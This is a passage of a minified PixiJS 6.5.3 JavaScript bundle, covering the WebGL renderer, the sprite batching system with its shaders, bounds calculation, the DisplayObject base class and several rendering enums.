\n\n","background: #ff66a5; padding:5px 0;","background: #ff66a5; padding:5px 0;","color: #ff66a5; background: #030307; padding:5px 0;","background: #ff66a5; padding:5px 0;","background: #ffc3dc; padding:5px 0;","background: #ff66a5; padding:5px 0;","color: #ff2424; background: #fff; padding:5px 0;","color: #ff2424; background: #fff; padding:5px 0;","color: #ff2424; background: #fff; padding:5px 0;"];(e=globalThis.console).log.apply(e,i)}else globalThis.console&&globalThis.console.log("PixiJS 6.5.3 - "+t+" - http://www.pixijs.com/");Hl=!0}}(2===r.context.webGLVersion?"WebGL 2":"WebGL 1"),r.resize(r.options.width,r.options.height),r}return Hc(e,t),e.create=function(t){if(void 0===Gl&&(Gl=function(){var t={stencil:!0,failIfMajorPerformanceCaveat:Fl.FAIL_IF_MAJOR_PERFORMANCE_CAVEAT};try{if(!Fl.ADAPTER.getWebGLRenderingContext())return!1;var e=Fl.ADAPTER.createCanvas(),i=e.getContext("webgl",t)||e.getContext("experimental-webgl",t),r=!(!i||!i.getContextAttributes().stencil);if(i){var n=i.getExtension("WEBGL_lose_context");n&&n.loseContext()}return i=null,r}catch(t){return!1}}()),Gl)return new e(t);throw new Error('WebGL unsupported in this browser, use "pixi.js-legacy" for fallback canvas2d support.')},e.prototype.contextChange=function(){var t,e=this.gl;if(1===this.context.webGLVersion){var i=e.getParameter(e.FRAMEBUFFER_BINDING);e.bindFramebuffer(e.FRAMEBUFFER,null),t=e.getParameter(e.SAMPLES),e.bindFramebuffer(e.FRAMEBUFFER,i)}else i=e.getParameter(e.DRAW_FRAMEBUFFER_BINDING),e.bindFramebuffer(e.DRAW_FRAMEBUFFER,null),t=e.getParameter(e.SAMPLES),e.bindFramebuffer(e.DRAW_FRAMEBUFFER,i);t>=gl.HIGH?this.multisample=gl.HIGH:t>=gl.MEDIUM?this.multisample=gl.MEDIUM:t>=gl.LOW?this.multisample=gl.LOW:this.multisample=gl.NONE},e.prototype.addSystem=function(t,e){var i=new t(this);if(this[e])throw new Error('Whoops! The name "'+e+'" is already in use');for(var r in this[e]=i,this.runners)this.runners[r].add(i);return this},e.prototype.render=function(t,e){var i,r,n,s;if(e&&(e instanceof ld?(ec("6.0.0","Renderer#render arguments changed, use options instead."),i=e,r=arguments[2],n=arguments[3],s=arguments[4]):(i=e.renderTexture,r=e.clear,n=e.transform,s=e.skipUpdateTransform)),this.renderingToScreen=!i,this.runners.prerender.emit(),this.emit("prerender"),this.projection.transform=n,!this.context.isLost){if(i||(this._lastObjectRendered=t),!s){var o=t.enableTempParent();t.updateTransform(),t.disableTempParent(o)}this.renderTexture.bind(i),this.batch.currentRenderer.start(),(void 0!==r?r:this.clearBeforeRender)&&this.renderTexture.clear(),t.render(this),this.batch.currentRenderer.flush(),i&&i.baseTexture.update(),this.runners.postrender.emit(),this.projection.transform=null,this.emit("postrender")}},e.prototype.generateTexture=function(e,i,r,n){void 0===i&&(i={});var s=t.prototype.generateTexture.call(this,e,i,r,n);return this.framebuffer.blit(),s},e.prototype.resize=function(e,i){t.prototype.resize.call(this,e,i),this.runners.resize.emit(this.screen.height,this.screen.width)},e.prototype.reset=function(){return this.runners.reset.emit(),this},e.prototype.clear=function(){this.renderTexture.bind(),this.renderTexture.clear()},e.prototype.destroy=function(e){for(var i in this.runners.destroy.emit(),this.runners)this.runners[i].destroy();t.prototype.destroy.call(this,e),this.gl=null},Object.defineProperty(e.prototype,"extract",{get:function(){return ec("6.0.0","Renderer#extract has been deprecated, please use Renderer#plugins.extract instead."),this.plugins.extract},enumerable:!1,configurable:!0}),e.registerPlugin=function(t,e){ec("6.5.0","Renderer.registerPlugin() has been deprecated, please use extensions.add() instead."),cc.add({name:t,type:ac.RendererPlugin,ref:e})},e.__plugins={},e}(Fp);cc.handleByMap(ac.RendererPlugin,Up.__plugins);var kp=function(){this.texArray=null,this.blend=0,this.type=el.TRIANGLES,this.start=0,this.size=0,this.data=null},Gp=function(){function t(){this.elements=[],this.ids=[],this.count=0}return t.prototype.clear=function(){for(var t=0;t<this.count;t++)this.elements[t]=null;this.count=0},t}(),Hp=function(){function t(t){"number"==typeof t?this.rawBinaryData=new ArrayBuffer(t):t instanceof Uint8Array?this.rawBinaryData=t.buffer:this.rawBinaryData=t,this.uint32View=new Uint32Array(this.rawBinaryData),this.float32View=new Float32Array(this.rawBinaryData)}return Object.defineProperty(t.prototype,"int8View",{get:function(){return this._int8View||(this._int8View=new Int8Array(this.rawBinaryData)),this._int8View},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"uint8View",{get:function(){return this._uint8View||(this._uint8View=new Uint8Array(this.rawBinaryData)),this._uint8View},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"int16View",{get:function(){return this._int16View||(this._int16View=new Int16Array(this.rawBinaryData)),this._int16View},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"uint16View",{get:function(){return this._uint16View||(this._uint16View=new Uint16Array(this.rawBinaryData)),this._uint16View},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"int32View",{get:function(){return this._int32View||(this._int32View=new Int32Array(this.rawBinaryData)),this._int32View},enumerable:!1,configurable:!0}),t.prototype.view=function(t){return this[t+"View"]},t.prototype.destroy=function(){this.rawBinaryData=null,this._int8View=null,this._uint8View=null,this._int16View=null,this._uint16View=null,this._int32View=null,this.uint32View=null,this.float32View=null},t.sizeOf=function(t){switch(t){case"int8":case"uint8":return 1;case"int16":case"uint16":return 2;case"int32":case"uint32":case"float32":return 4;default:throw new Error(t+" isn't a valid view type")}},t}(),zp=function(t){function e(e){var i=t.call(this,e)||this;return i.shaderGenerator=null,i.geometryClass=null,i.vertexSize=null,i.state=ap.for2d(),i.size=4*Fl.SPRITE_BATCH_SIZE,i._vertexCount=0,i._indexCount=0,i._bufferedElements=[],i._bufferedTextures=[],i._bufferSize=0,i._shader=null,i._packedGeometries=[],i._packedGeometryPoolSize=2,i._flushId=0,i._aBuffers={},i._iBuffers={},i.MAX_TEXTURES=1,i.renderer.on("prerender",i.onPrerender,i),e.runners.contextChange.add(i),i._dcIndex=0,i._aIndex=0,i._iIndex=0,i._attributeBuffer=null,i._indexBuffer=null,i._tempBoundTextures=[],i}return Hc(e,t),e.prototype.contextChange=function(){var t=this.renderer.gl;Fl.PREFER_ENV===Ku.WEBGL_LEGACY?this.MAX_TEXTURES=1:(this.MAX_TEXTURES=Math.min(t.getParameter(t.MAX_TEXTURE_IMAGE_UNITS),Fl.SPRITE_MAX_TEXTURES),this.MAX_TEXTURES=function(t,e){if(0===t)throw new Error("Invalid value of `0` passed to `checkMaxIfStatementsInShader`");for(var i=e.createShader(e.FRAGMENT_SHADER);;){var r=ep.replace(/%forloop%/gi,ip(t));if(e.shaderSource(i,r),e.compileShader(i),e.getShaderParameter(i,e.COMPILE_STATUS))break;t=t/2|0}return t}(this.MAX_TEXTURES,t)),this._shader=this.shaderGenerator.generateShader(this.MAX_TEXTURES);for(var e=0;e<this._packedGeometryPoolSize;e++)this._packedGeometries[e]=new this.geometryClass;this.initFlushBuffers()},e.prototype.initFlushBuffers=function(){for(var t=e._drawCallPool,i=e._textureArrayPool,r=this.size/4,n=Math.floor(r/this.MAX_TEXTURES)+1;t.length<r;)t.push(new kp);for(;i.length<n;)i.push(new Gp);for(var s=0;s<this.MAX_TEXTURES;s++)this._tempBoundTextures[s]=null},e.prototype.onPrerender=function(){this._flushId=0},e.prototype.render=function(t){t._texture.valid&&(this._vertexCount+t.vertexData.length/2>this.size&&this.flush(),this._vertexCount+=t.vertexData.length/2,this._indexCount+=t.indices.length,this._bufferedTextures[this._bufferSize]=t._texture.baseTexture,this._bufferedElements[this._bufferSize++]=t)},e.prototype.buildTexturesAndDrawCalls=function(){var t=this._bufferedTextures,i=this.MAX_TEXTURES,r=e._textureArrayPool,n=this.renderer.batch,s=this._tempBoundTextures,o=this.renderer.textureGC.count,a=++$c._globalBatch,h=0,u=r[0],l=0;n.copyBoundTextures(s,i);for(var c=0;c<this._bufferSize;++c){var d=t[c];t[c]=null,d._batchEnabled!==a&&(u.count>=i&&(n.boundArray(u,s,a,i),this.buildDrawCalls(u,l,c),l=c,u=r[++h],++a),d._batchEnabled=a,d.touched=o,u.elements[u.count++]=d)}for(u.count>0&&(n.boundArray(u,s,a,i),this.buildDrawCalls(u,l,this._bufferSize),++h,++a),c=0;c<s.length;c++)s[c]=null;$c._globalBatch=a},e.prototype.buildDrawCalls=function(t,i,r){var n=this,s=n._bufferedElements,o=n._attributeBuffer,a=n._indexBuffer,h=n.vertexSize,u=e._drawCallPool,l=this._dcIndex,c=this._aIndex,d=this._iIndex,p=u[l];p.start=this._iIndex,p.texArray=t;for(var f=i;f<r;++f){var g=s[f],m=g._texture.baseTexture,v=Xl[m.alphaMode?1:0][g.blendMode];s[f]=null,i<f&&p.blend!==v&&(p.size=d-p.start,i=f,(p=u[++l]).texArray=t,p.start=d),this.packInterleavedGeometry(g,o,a,c,d),c+=g.vertexData.length/2*h,d+=g.indices.length,p.blend=v}i<r&&(p.size=d-p.start,++l),this._dcIndex=l,this._aIndex=c,this._iIndex=d},e.prototype.bindAndClearTexArray=function(t){for(var e=this.renderer.texture,i=0;i<t.count;i++)e.bind(t.elements[i],t.ids[i]),t.elements[i]=null;t.count=0},e.prototype.updateGeometry=function(){var t=this,e=t._packedGeometries,i=t._attributeBuffer,r=t._indexBuffer;Fl.CAN_UPLOAD_SAME_BUFFER?(e[this._flushId]._buffer.update(i.rawBinaryData),e[this._flushId]._indexBuffer.update(r),this.renderer.geometry.updateBuffers()):(this._packedGeometryPoolSize<=this._flushId&&(this._packedGeometryPoolSize++,e[this._flushId]=new this.geometryClass),e[this._flushId]._buffer.update(i.rawBinaryData),e[this._flushId]._indexBuffer.update(r),this.renderer.geometry.bind(e[this._flushId]),this.renderer.geometry.updateBuffers(),this._flushId++)},e.prototype.drawBatches=function(){for(var t=this._dcIndex,i=this.renderer,r=i.gl,n=i.state,s=e._drawCallPool,o=null,a=0;a<t;a++){var h=s[a],u=h.texArray,l=h.type,c=h.size,d=h.start,p=h.blend;o!==u&&(o=u,this.bindAndClearTexArray(u)),this.state.blendMode=p,n.set(this.state),r.drawElements(l,c,r.UNSIGNED_SHORT,2*d)}},e.prototype.flush=function(){0!==this._vertexCount&&(this._attributeBuffer=this.getAttributeBuffer(this._vertexCount),this._indexBuffer=this.getIndexBuffer(this._indexCount),this._aIndex=0,this._iIndex=0,this._dcIndex=0,this.buildTexturesAndDrawCalls(),this.updateGeometry(),this.drawBatches(),this._bufferSize=0,this._vertexCount=0,this._indexCount=0)},e.prototype.start=function(){this.renderer.state.set(this.state),this.renderer.texture.ensureSamplerType(this.MAX_TEXTURES),this.renderer.shader.bind(this._shader),Fl.CAN_UPLOAD_SAME_BUFFER&&this.renderer.geometry.bind(this._packedGeometries[this._flushId])},e.prototype.stop=function(){this.flush()},e.prototype.destroy=function(){for(var e=0;e<this._packedGeometryPoolSize;e++)this._packedGeometries[e]&&this._packedGeometries[e].destroy();this.renderer.off("prerender",this.onPrerender,this),this._aBuffers=null,this._iBuffers=null,this._packedGeometries=null,this._attributeBuffer=null,this._indexBuffer=null,this._shader&&(this._shader.destroy(),this._shader=null),t.prototype.destroy.call(this)},e.prototype.getAttributeBuffer=function(t){var e=Wl(Math.ceil(t/8)),i=ql(e),r=8*e;this._aBuffers.length<=i&&(this._iBuffers.length=i+1);var n=this._aBuffers[r];return n||(this._aBuffers[r]=n=new Hp(r*this.vertexSize*4)),n},e.prototype.getIndexBuffer=function(t){var e=Wl(Math.ceil(t/12)),i=ql(e),r=12*e;this._iBuffers.length<=i&&(this._iBuffers.length=i+1);var n=this._iBuffers[i];return n||(this._iBuffers[i]=n=new Uint16Array(r)),n},e.prototype.packInterleavedGeometry=function(t,e,i,r,n){for(var s=e.uint32View,o=e.float32View,a=r/this.vertexSize,h=t.uvs,u=t.indices,l=t.vertexData,c=t._texture.baseTexture._batchLocation,d=Math.min(t.worldAlpha,1),p=d<1&&t._texture.baseTexture.alphaMode?jl(t._tintRGB,d):t._tintRGB+(255*d<<24),f=0;f<l.length;f+=2)o[r++]=l[f],o[r++]=l[f+1],o[r++]=h[f],o[r++]=h[f+1],s[r++]=p,o[r++]=c;for(f=0;f<u.length;f++)i[n++]=a+u[f]},e._drawCallPool=[],e._textureArrayPool=[],e}(Cd),Vp=function(){function t(t,e){if(this.vertexSrc=t,this.fragTemplate=e,this.programCache={},this.defaultGroupCache={},e.indexOf("%count%")<0)throw new Error('Fragment template must contain "%count%".');if(e.indexOf("%forloop%")<0)throw new Error('Fragment template must contain "%forloop%".')}return t.prototype.generateShader=function(t){if(!this.programCache[t]){for(var e=new Int32Array(t),i=0;i<t;i++)e[i]=i;this.defaultGroupCache[t]=Td.from({uSamplers:e},!0);var r=this.fragTemplate;r=(r=r.replace(/%count%/gi,""+t)).replace(/%forloop%/gi,this.generateSampleSrc(t)),this.programCache[t]=new sp(this.vertexSrc,r)}var n={tint:new Float32Array([1,1,1,1]),translationMatrix:new Cc,default:this.defaultGroupCache[t]};return new op(this.programCache[t],n)},t.prototype.generateSampleSrc=function(t){var e="";e+="\n",e+="\n";for(var i=0;i<t;i++)i>0&&(e+="\nelse "),i<t-1&&(e+="if(vTextureId < "+i+".5)"),e+="\n{",e+="\n\tcolor = texture2D(uSamplers["+i+"], vTextureCoord);",e+="\n}";return(e+="\n")+"\n"},t}(),Xp=function(t){function e(e){void 0===e&&(e=!1);var i=t.call(this)||this;return i._buffer=new fd(null,e,!1),i._indexBuffer=new fd(null,e,!0),i.addAttribute("aVertexPosition",i._buffer,2,!1,nl.FLOAT).addAttribute("aTextureCoord",i._buffer,2,!1,nl.FLOAT).addAttribute("aColor",i._buffer,4,!0,nl.UNSIGNED_BYTE).addAttribute("aTextureId",i._buffer,1,!0,nl.FLOAT).addIndex(i._indexBuffer),i}return Hc(e,t),e}(yd),jp="precision highp float;\nattribute vec2 aVertexPosition;\nattribute vec2 aTextureCoord;\nattribute vec4 aColor;\nattribute float aTextureId;\n\nuniform mat3 projectionMatrix;\nuniform mat3 translationMatrix;\nuniform vec4 tint;\n\nvarying vec2 vTextureCoord;\nvarying vec4 vColor;\nvarying float vTextureId;\n\nvoid main(void){\n    gl_Position = vec4((projectionMatrix * translationMatrix * vec3(aVertexPosition, 1.0)).xy, 0.0, 1.0);\n\n    vTextureCoord = aTextureCoord;\n    vTextureId = aTextureId;\n    vColor = aColor * tint;\n}\n",$p="varying vec2 vTextureCoord;\nvarying vec4 vColor;\nvarying float vTextureId;\nuniform sampler2D uSamplers[%count%];\n\nvoid main(void){\n    vec4 color;\n    %forloop%\n    gl_FragColor = color * vColor;\n}\n",Wp=function(){function t(){}return t.create=function(t){var e=Object.assign({vertex:jp,fragment:$p,geometryClass:Xp,vertexSize:6},t),i=e.vertex,r=e.fragment,n=e.vertexSize,s=e.geometryClass;return function(t){function e(e){var o=t.call(this,e)||this;return o.shaderGenerator=new Vp(i,r),o.geometryClass=s,o.vertexSize=n,o}return Hc(e,t),e}(zp)},Object.defineProperty(t,"defaultVertexSrc",{get:function(){return jp},enumerable:!1,configurable:!0}),Object.defineProperty(t,"defaultFragmentTemplate",{get:function(){return $p},enumerable:!1,configurable:!0}),t}().create();Object.assign(Wp,{extension:{name:"batch",type:ac.RendererPlugin}});var Yp={},qp=function(t){Object.defineProperty(Yp,t,{get:function(){return ec("6.0.0","PIXI.systems."+t+" has moved to PIXI."+t),id[t]}})};for(var Zp in id)qp(Zp);var Kp={},Qp=function(t){Object.defineProperty(Kp,t,{get:function(){return ec("6.0.0","PIXI.resources."+t+" has moved to PIXI."+t),Np[t]}})};for(var Zp in Np)Qp(Zp);Fl.SORTABLE_CHILDREN=!1;var Jp=function(){function t(){this.minX=1/0,this.minY=1/0,this.maxX=-1/0,this.maxY=-1/0,this.rect=null,this.updateID=-1}return t.prototype.isEmpty=function(){return this.minX>this.maxX||this.minY>this.maxY},t.prototype.clear=function(){this.minX=1/0,this.minY=1/0,this.maxX=-1/0,this.maxY=-1/0},t.prototype.getRectangle=function(t){return this.minX>this.maxX||this.minY>this.maxY?bc.EMPTY:((t=t||new bc(0,0,1,1)).x=this.minX,t.y=this.minY,t.width=this.maxX-this.minX,t.height=this.maxY-this.minY,t)},t.prototype.addPoint=function(t){this.minX=Math.min(this.minX,t.x),this.maxX=Math.max(this.maxX,t.x),this.minY=Math.min(this.minY,t.y),this.maxY=Math.max(this.maxY,t.y)},t.prototype.addPointMatrix=function(t,e){var i=t.a,r=t.b,n=t.c,s=t.d,o=t.tx,a=t.ty,h=i*e.x+n*e.y+o,u=r*e.x+s*e.y+a;this.minX=Math.min(this.minX,h),this.maxX=Math.max(this.maxX,h),this.minY=Math.min(this.minY,u),this.maxY=Math.max(this.maxY,u)},t.prototype.addQuad=function(t){var e=this.minX,i=this.minY,r=this.maxX,n=this.maxY,s=t[0],o=t[1];e=s<e?s:e,i=o<i?o:i,r=s>r?s:r,n=o>n?o:n,e=(s=t[2])<e?s:e,i=(o=t[3])<i?o:i,r=s>r?s:r,n=o>n?o:n,e=(s=t[4])<e?s:e,i=(o=t[5])<i?o:i,r=s>r?s:r,n=o>n?o:n,e=(s=t[6])<e?s:e,i=(o=t[7])<i?o:i,r=s>r?s:r,n=o>n?o:n,this.minX=e,this.minY=i,this.maxX=r,this.maxY=n},t.prototype.addFrame=function(t,e,i,r,n){this.addFrameMatrix(t.worldTransform,e,i,r,n)},t.prototype.addFrameMatrix=function(t,e,i,r,n){var s=t.a,o=t.b,a=t.c,h=t.d,u=t.tx,l=t.ty,c=this.minX,d=this.minY,p=this.maxX,f=this.maxY,g=s*e+a*i+u,m=o*e+h*i+l;c=g<c?g:c,d=m<d?m:d,p=g>p?g:p,f=m>f?m:f,c=(g=s*r+a*i+u)<c?g:c,d=(m=o*r+h*i+l)<d?m:d,p=g>p?g:p,f=m>f?m:f,c=(g=s*e+a*n+u)<c?g:c,d=(m=o*e+h*n+l)<d?m:d,p=g>p?g:p,f=m>f?m:f,c=(g=s*r+a*n+u)<c?g:c,d=(m=o*r+h*n+l)<d?m:d,p=g>p?g:p,f=m>f?m:f,this.minX=c,this.minY=d,this.maxX=p,this.maxY=f},t.prototype.addVertexData=function(t,e,i){for(var r=this.minX,n=this.minY,s=this.maxX,o=this.maxY,a=e;a<i;a+=2){var h=t[a],u=t[a+1];r=h<r?h:r,n=u<n?u:n,s=h>s?h:s,o=u>o?u:o}this.minX=r,this.minY=n,this.maxX=s,this.maxY=o},t.prototype.addVertices=function(t,e,i,r){this.addVerticesMatrix(t.worldTransform,e,i,r)},t.prototype.addVerticesMatrix=function(t,e,i,r,n,s){void 0===n&&(n=0),void 0===s&&(s=n);for(var o=t.a,a=t.b,h=t.c,u=t.d,l=t.tx,c=t.ty,d=this.minX,p=this.minY,f=this.maxX,g=this.maxY,m=i;m<r;m+=2){var v=e[m],_=e[m+1],y=o*v+h*_+l,x=u*_+a*v+c;d=Math.min(d,y-n),f=Math.max(f,y+n),p=Math.min(p,x-s),g=Math.max(g,x+s)}this.minX=d,this.minY=p,this.maxX=f,this.maxY=g},t.prototype.addBounds=function(t){var e=this.minX,i=this.minY,r=this.maxX,n=this.maxY;this.minX=t.minX<e?t.minX:e,this.minY=t.minY<i?t.minY:i,this.maxX=t.maxX>r?t.maxX:r,this.maxY=t.maxY>n?t.maxY:n},t.prototype.addBoundsMask=function(t,e){var i=t.minX>e.minX?t.minX:e.minX,r=t.minY>e.minY?t.minY:e.minY,n=t.maxX<e.maxX?t.maxX:e.maxX,s=t.maxY<e.maxY?t.maxY:e.maxY;if(i<=n&&r<=s){var o=this.minX,a=this.minY,h=this.maxX,u=this.maxY;this.minX=i<o?i:o,this.minY=r<a?r:a,this.maxX=n>h?n:h,this.maxY=s>u?s:u}},t.prototype.addBoundsMatrix=function(t,e){this.addFrameMatrix(e,t.minX,t.minY,t.maxX,t.maxY)},t.prototype.addBoundsArea=function(t,e){var i=t.minX>e.x?t.minX:e.x,r=t.minY>e.y?t.minY:e.y,n=t.maxX<e.x+e.width?t.maxX:e.x+e.width,s=t.maxY<e.y+e.height?t.maxY:e.y+e.height;if(i<=n&&r<=s){var o=this.minX,a=this.minY,h=this.maxX,u=this.maxY;this.minX=i<o?i:o,this.minY=r<a?r:a,this.maxX=n>h?n:h,this.maxY=s>u?s:u}},t.prototype.pad=function(t,e){void 0===t&&(t=0),void 0===e&&(e=t),this.isEmpty()||(this.minX-=t,this.maxX+=t,this.minY-=e,this.maxY+=e)},t.prototype.addFramePad=function(t,e,i,r,n,s){t-=n,e-=s,i+=n,r+=s,this.minX=this.minX<t?this.minX:t,this.maxX=this.maxX>i?this.maxX:i,this.minY=this.minY<e?this.minY:e,this.maxY=this.maxY>r?this.maxY:r},t}(),tf=function(t,e){return(tf=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var i in e)e.hasOwnProperty(i)&&(t[i]=e[i])})(t,e)};function ef(t,e){function i(){this.constructor=t}tf(t,e),t.prototype=null===e?Object.create(e):(i.prototype=e.prototype,new i)}var rf,nf,sf,of,af,hf,uf,lf,cf,df,pf,ff,gf,mf,vf,_f,yf,xf,Ef,bf,Tf=function(t){function e(){var e=t.call(this)||this;return e.tempDisplayObjectParent=null,e.transform=new Bc,e.alpha=1,e.visible=!0,e.renderable=!0,e.cullable=!1,e.cullArea=null,e.parent=null,e.worldAlpha=1,e._lastSortedIndex=0,e._zIndex=0,e.filterArea=null,e.filters=null,e._enabledFilters=null,e._bounds=new Jp,e._localBounds=null,e._boundsID=0,e._boundsRect=null,e._localBoundsRect=null,e._mask=null,e._maskRefCount=0,e._destroyed=!1,e.isSprite=!1,e.isMask=!1,e}return ef(e,t),e.mixin=function(t){for(var i=Object.keys(t),r=0;r<i.length;++r){var n=i[r];Object.defineProperty(e.prototype,n,Object.getOwnPropertyDescriptor(t,n))}},Object.defineProperty(e.prototype,"destroyed",{get:function(){return this._destroyed},enumerable:!1,configurable:!0}),e.prototype._recursivePostUpdateTransform=function(){this.parent?(this.parent._recursivePostUpdateTransform(),this.transform.updateTransform(this.parent.transform)):this.transform.updateTransform(this._tempDisplayObjectParent.transform)},e.prototype.updateTransform=function(){this._boundsID++,this.transform.updateTransform(this.parent.transform),this.worldAlpha=this.alpha*this.parent.worldAlpha},e.prototype.getBounds=function(t,e){return t||(this.parent?(this._recursivePostUpdateTransform(),this.updateTransform()):(this.parent=this._tempDisplayObjectParent,this.updateTransform(),this.parent=null)),this._bounds.updateID!==this._boundsID&&(this.calculateBounds(),this._bounds.updateID=this._boundsID),e||(this._boundsRect||(this._boundsRect=new bc),e=this._boundsRect),this._bounds.getRectangle(e)},e.prototype.getLocalBounds=function(t){t||(this._localBoundsRect||(this._localBoundsRect=new bc),t=this._localBoundsRect),this._localBounds||(this._localBounds=new Jp);var e=this.transform,i=this.parent;this.parent=null,this.transform=this._tempDisplayObjectParent.transform;var r=this._bounds,n=this._boundsID;this._bounds=this._localBounds;var s=this.getBounds(!1,t);return this.parent=i,this.transform=e,this._bounds=r,this._bounds.updateID+=this._boundsID-n,s},e.prototype.toGlobal=function(t,e,i){return void 0===i&&(i=!1),i||(this._recursivePostUpdateTransform(),this.parent?this.displayObjectUpdateTransform():(this.parent=this._tempDisplayObjectParent,this.displayObjectUpdateTransform(),this.parent=null)),this.worldTransform.apply(t,e)},e.prototype.toLocal=function(t,e,i,r){return e&&(t=e.toGlobal(t,i,r)),r||(this._recursivePostUpdateTransform(),this.parent?this.displayObjectUpdateTransform():(this.parent=this._tempDisplayObjectParent,this.displayObjectUpdateTransform(),this.parent=null)),this.worldTransform.applyInverse(t,i)},e.prototype.setParent=function(t){if(!t||!t.addChild)throw new Error("setParent: Argument must be a Container");return t.addChild(this),t},e.prototype.setTransform=function(t,e,i,r,n,s,o,a,h){return void 0===t&&(t=0),void 0===e&&(e=0),void 0===i&&(i=1),void 0===r&&(r=1),void 0===n&&(n=0),void 0===s&&(s=0),void 0===o&&(o=0),void 0===a&&(a=0),void 0===h&&(h=0),this.position.x=t,this.position.y=e,this.scale.x=i||1,this.scale.y=r||1,this.rotation=n,this.skew.x=s,this.skew.y=o,this.pivot.x=a,this.pivot.y=h,this},e.prototype.destroy=function(t){this.parent&&this.parent.removeChild(this),this._destroyed=!0,this.transform=null,this.parent=null,this._bounds=null,this.mask=null,this.cullArea=null,this.filters=null,this.filterArea=null,this.hitArea=null,this.interactive=!1,this.interactiveChildren=!1,this.emit("destroyed"),this.removeAllListeners()},Object.defineProperty(e.prototype,"_tempDisplayObjectParent",{get:function(){return null===this.tempDisplayObjectParent&&(this.tempDisplayObjectParent=new Df),this.tempDisplayObjectParent},enumerable:!1,configurable:!0}),e.prototype.enableTempParent=function(){var t=this.parent;return this.parent=this._tempDisplayObjectParent,t},e.prototype.disableTempParent=function(t){this.parent=t},Object.defineProperty(e.prototype,"x",{get:function(){return this.position.x},set:function(t){this.transform.position.x=t},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"y",{get:function(){return this.position.y},set:function(t){this.transform.position.y=t},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"worldTransform",{get:function(){return this.transform.worldTransform},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"localTransform",{get:function(){return this.transform.localTransform},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"position",{get:function(){return this.transform.position},set:function(t){this.transform.position.copyFrom(t)},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"scale",{get:function(){return this.transform.scale},set:function(t){this.transform.scale.copyFrom(t)},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"pivot",{get:function(){return this.transform.pivot},set:function(t){this.transform.pivot.copyFrom(t)},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"skew",{get:function(){return this.transform.skew},set:function(t){this.transform.skew.copyFrom(t)},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"rotation",{get:function(){return this.transform.rotation},set:function(t){this.transform.rotation=t},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"angle",{get:function(){return this.transform.rotation*_c},set:function(t){this.transform.rotation=t*yc},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"zIndex",{get:function(){return this._zIndex},set:function(t){this._zIndex=t,this.parent&&(this.parent.sortDirty=!0)},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"worldVisible",{get:function(){var t=this;do{if(!t.visible)return!1;t=t.parent}while(t);return!0},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"mask",{get:function(){return this._mask},set:function(t){var e;this._mask!==t&&(this._mask&&(e=this._mask.isMaskData?this._mask.maskObject:this._mask)&&(e._maskRefCount--,0===e._maskRefCount&&(e.renderable=!0,e.isMask=!1)),this._mask=t,this._mask&&(e=this._mask.isMaskData?this._mask.maskObject:this._mask)&&(0===e._maskRefCount&&(e.renderable=!1,e.isMask=!0),e._maskRefCount++))},enumerable:!1,configurable:!0}),e}(Ll),Df=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.sortDirty=null,e}return ef(e,t),e}(Tf);function wf(t,e){return t.zIndex===e.zIndex?t._lastSortedIndex-e._lastSortedIndex:t.zIndex-e.zIndex}Tf.prototype.displayObjectUpdateTransform=Tf.prototype.updateTransform,function(t){t[t.WEBGL_LEGACY=0]="WEBGL_LEGACY",t[t.WEBGL=1]="WEBGL",t[t.WEBGL2=2]="WEBGL2"}(rf||(rf={})),function(t){t[t.UNKNOWN=0]="UNKNOWN",t[t.WEBGL=1]="WEBGL",t[t.CANVAS=2]="CANVAS"}(nf||(nf={})),function(t){t[t.COLOR=16384]="COLOR",t[t.DEPTH=256]="DEPTH",t[t.STENCIL=1024]="STENCIL"}(sf||(sf={})),function(t){t[t.NORMAL=0]="NORMAL",t[t.ADD=1]="ADD",t[t.MULTIPLY=2]="MULTIPLY",t[t.SCREEN=3]="SCREEN",t[t.OVERLAY=4]="OVERLAY",t[t.DARKEN=5]="DARKEN",t[t.LIGHTEN=6]="LIGHTEN",t[t.COLOR_DODGE=7]="COLOR_DODGE",t[t.COLOR_BURN=8]="COLOR_BURN",t[t.HARD_LIGHT=9]="HARD_LIGHT",t[t.SOFT_LIGHT=10]="SOFT_LIGHT",t[t.DIFFERENCE=11]="DIFFERENCE",t[t.EXCLUSION=12]="EXCLUSION",t[t.HUE=13]="HUE",t[t.SATURATION=14]="SATURATION",t[t.COLOR=15]="COLOR",t[t.LUMINOSITY=16]="LUMINOSITY",t[t.NORMAL_NPM=17]="NORMAL_NPM",t[t.ADD_NPM=18]="ADD_NPM",t[t.SCREEN_NPM=19]="SCREEN_NPM",t[t.NONE=20]="NONE",t[t.SRC_OVER=0]="SRC_OVER",t[t.SRC_IN=21]="SRC_IN",t[t.SRC_OUT=22]="SRC_OUT",t[t.SRC_ATOP=23]="SRC_ATOP",t[t.DST_OVER=24]="DST_OVER",t[t.DST_IN=25]="DST_IN",t[t.DST_OUT=26]="DST_OUT",t[t.DST_ATOP=27]="DST_ATOP",t[t.ERASE=26]="ERASE",t[t.SUBTRACT=28]="SUBTRACT",t[t.XOR=29]="XOR"}(of||(of={})),function(t){t[t.POINTS=0]="POINTS",t[t.LINES=1]="LINES",t[t.LINE_LOOP=2]="LINE_LOOP",t[t.LINE_STRIP=3]="LINE_STRIP",t[t.TRIANGLES=4]="TRIANGLES",t[t.TRIANGLE_STRIP=5]="TRIANGLE_STRIP",t[t.TRIANGLE_FAN=6]="TRIANGLE_FAN"}(af||(af={})),function(t){t[t.RGBA=6408]="RGBA",t[t.RGB=6407]="RGB",t[t.RG=33319]="RG",t[t.RED=6403]="RED",t[t.RGBA_INTEGER=36249]="RGBA_INTEGER",